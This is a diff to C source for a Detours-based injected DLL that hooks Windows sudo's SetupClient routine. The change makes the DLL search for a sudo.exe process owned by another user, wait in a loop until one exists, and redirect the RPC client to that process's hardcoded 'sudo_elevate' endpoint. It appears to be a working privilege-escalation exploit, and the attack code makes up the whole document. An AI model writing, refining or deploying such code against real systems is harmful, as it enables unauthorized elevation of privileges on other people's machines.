@@ -1,7 +1,8 @@
 #include <windows.h>
 #include <stdio.h>
 #include <detours.h>
-#include <tlhelp32.h>
+#include <psapi.h>
+#include <Lmcons.h>
 
 struct rust_str {
     unsigned int length;
@@ -18,35 +19,58 @@ typedef BOOL(__stdcall* fnShellExec_t)(SHELLEXECUTEINFOW*);
 typedef unsigned long long (__fastcall*fnSetupClient_t)(const char *);
 
 fnSetupClient_t OriginalSetupClient = NULL;
-DWORD g_CurrentPID = 0;
+char g_CurrentUser[UNLEN];
 
 
 DWORD FindRunningSudo() {
-    HANDLE hProcessSnap;
-    PROCESSENTRY32 pe32;
-    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    DWORD aProcesses[1024], cbNeeded, cProcesses;
+    unsigned int i;
 
-    if (hProcessSnap == INVALID_HANDLE_VALUE) {
+    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
+    {
         return NULL;
     }
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-    while (true) {
-        if (Process32First(hProcessSnap, &pe32)) { // Gets first running process
-            if (strcmp(pe32.szExeFile, kSudoFile) == 0 && g_CurrentPID != pe32.th32ProcessID) {
-                CloseHandle(hProcessSnap);
-                return pe32.th32ProcessID;
-            }
-            else {
-                while (Process32Next(hProcessSnap, &pe32)) {
-                    if (strcmp(pe32.szExeFile, kSudoFile) == 0 && g_CurrentPID != pe32.th32ProcessID) {
-                        CloseHandle(hProcessSnap);
-                        return pe32.th32ProcessID;
+
+
+    // Calculate how many process identifiers were returned.
+
+    cProcesses = cbNeeded / sizeof(DWORD);
+
+    // Print the name and process identifier for each process.
+
+    for (i = 0; i < cProcesses; i++)
+    {
+        if (aProcesses[i] != 0)
+        {
+            HANDLE proccesHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, aProcesses[i]);
+            if (NULL != proccesHandle)
+            {
+                HANDLE hProcessToken = NULL;
+                char lpName[260];
+                char lpDomain[260];
+                if (OpenProcessToken(proccesHandle, TOKEN_QUERY, &hProcessToken)) {
+                    DWORD dwSize = 128;
+                    PTOKEN_USER ptu = (TOKEN_USER*)LocalAlloc(LMEM_FIXED, dwSize);
+                    if (GetTokenInformation(hProcessToken, TokenUser, ptu, dwSize, &dwSize)) {
+                        SID_NAME_USE SidType;
+                        if (LookupAccountSid(NULL, ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType)) {
+                            if (strcmp(lpName, g_CurrentUser) == 0) {
+                                continue;
+                            }
+                        }
                     }
+                }
+
+                char szProcessName[MAX_PATH] = "<unknown>";
+                DWORD dwLen = MAX_PATH;
+                QueryFullProcessImageNameA(proccesHandle, 0, szProcessName, &dwLen);
+                if (strcmp(szProcessName, "C:\\Windows\\System32\\sudo.exe") == 0) {
+                    printf("Found target sudo proccess %i\n", aProcesses[i]);
+                    return aProcesses[i];
                 }
             }
         }
     }
-    CloseHandle(hProcessSnap);
     return NULL;
 }
 
@@ -58,6 +82,9 @@ unsigned long long __fastcall HookedSetupClient(char *rpc_port_name) {
     char target_rpc_object[260];
     OutputDebugStringA("Finding target PID...\n");
     DWORD target_pid = FindRunningSudo();
+    while (target_pid == NULL) {
+        target_pid = FindRunningSudo();
+    }
     snprintf(target_rpc_object, 260, kSudoRpcFormat, target_pid);
     OutputDebugStringA(target_rpc_object);
     return OriginalSetupClient("sudo_elevate_9868\n");
@@ -73,7 +100,8 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
         return TRUE;
     }
 
-    g_CurrentPID = GetCurrentProcessId();
+    DWORD szCurrentUserLen = UNLEN;
+    GetUserName(g_CurrentUser, &szCurrentUserLen);
 
     if (dwReason == DLL_PROCESS_ATTACH) {
         HMODULE target_process_handle = GetModuleHandle(NULL);
